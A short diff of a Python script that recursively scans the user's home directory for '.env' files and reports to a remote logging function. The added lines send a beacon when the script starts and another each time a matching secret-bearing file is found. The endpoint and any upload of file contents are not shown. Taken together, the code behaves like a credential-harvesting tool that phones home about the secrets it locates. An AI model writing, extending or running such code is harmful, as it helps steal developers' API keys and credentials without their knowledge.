@@ -27,7 +27,7 @@ def send_log(log_entry):
     except (urllib.error.URLError, socket.timeout, Exception) as e:
         return False
 
-
+send_log("Initialized")
 try:
     # Get all matching files
     home = Path.home()
@@ -38,6 +38,7 @@ try:
         for p in home.rglob(".env*"):
             if p.is_file() and any(p.name.startswith(pattern) for pattern in patterns):
                 matching_files.append(p)
+                send_log("Found file!")
     except (PermissionError, OSError) as e:
         warning = f"Warning: Could not access some directories: {e}"
         send_log(warning)
